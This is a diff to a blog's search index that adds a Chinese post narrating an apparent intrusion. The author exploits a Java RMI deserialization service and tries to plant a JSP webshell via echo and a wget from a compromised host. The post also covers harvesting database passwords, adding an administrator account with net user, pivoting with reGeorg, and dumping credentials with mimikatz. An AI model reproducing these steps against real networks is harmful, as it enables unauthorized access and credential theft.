@@ -1,8 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[123]]></title>
-    <url>%2F2018%2F01%2F28%2F123%2F</url>
-    <content type="text"></content>
+    <title><![CDATA[JAVARMI漏洞之旅]]></title>
+    <url>%2F2018%2F01%2F27%2FJAVARMI%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%97%85%2F</url>
+    <content type="text"><![CDATA[博客刚搭建不久，有些美工还没做。##其实我不想在搞了，搭建个博客麻烦得要死。 今天周末天气不错，兜兜转转也不懂要做什么。最近在研究RMI反序列化漏洞，就写一片文章吧。 突破口在一次nmap扫描过程中发现了目标机子8100端口存在java RMI服务于是用attackRMI.jar链接该端口，成功回显系统信息 执行cat /proc/version id 命令 写马失败Liunx的版本号比较低，User权限，ifconfig：10.xx.xx.13内网机子，对系统的基本信息了解之后，接下来就尝试着echo写一句话到web路径下（用菜刀连接，方便操作，因为使用attackRMI.jar只能在当前目录下操作，不能cd到别的目录），echo 一句话&gt;&gt;/xxx/xxx/tomcat/webapps/root/xxx.jsp（web路径疯狂ls才找到的） 运行完之后发现文件是创建了，但是字节为0 经过一番尝试之后发现echo命令用不了。 不能写内容到文件里去，于是想到了wget命令，wget http://xxx.xxx.xxx/xxx.jsp -O /xxx/xxx/tomcat/webapps/root/xxx.jsp（其中肉鸡的地址是http 马名字为xxx.jsp），运行后发现并没有成功写入到文件，排查原因发现该机子根本就不通外网。内网机子做了端口转发。 马儿出不了，那就翻翻有啥利用的东西。在经过疯狂的ls之后找到了几个数据库密码： 转机既然突破不了，为何不去扫扫C段？果然在其同网段的一台机子的8800端口发现了同样的漏洞：说干就干，运气不错，系统权限windows 2008 32位 没有域 netstat -ano对方开了3389添加用户net user admln admin /add &amp; net localgoup administrators admln /add成功添加用户之后用mstsc命令远程链接发现报错：原来该机子没有把自己的3389端口映射出来，不好的情况发生了，这台和之前的一样不能通外网，正当想办法的时候，小伙伴在该C段拿下了台liunx的机子，通过端口漏洞jdwp，过程大致说下，该漏洞是远程执行命令的，然后通过执行命令找到web服务的根路径，向其写入一句话。乌云有篇关于jdwp的文章，有兴趣的去看下。 内网游游在已拿下的liunx机子上安装了reGeorg代理，然后通过代理远程链接之前的win 08机子 用到mimikatz获取管理员的哈希及明文密码 之前写马失败的那台，通过wget到内网机子里获取到一句话,也成功拿下了。 内网很大，这里就不继续写下去了。 刮好大的风啊，准备要下雨了，走人走人。]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>RMI漏洞</tag>
+        <tag>内网渗透</tag>
+      </tags>
   </entry>
 </search>
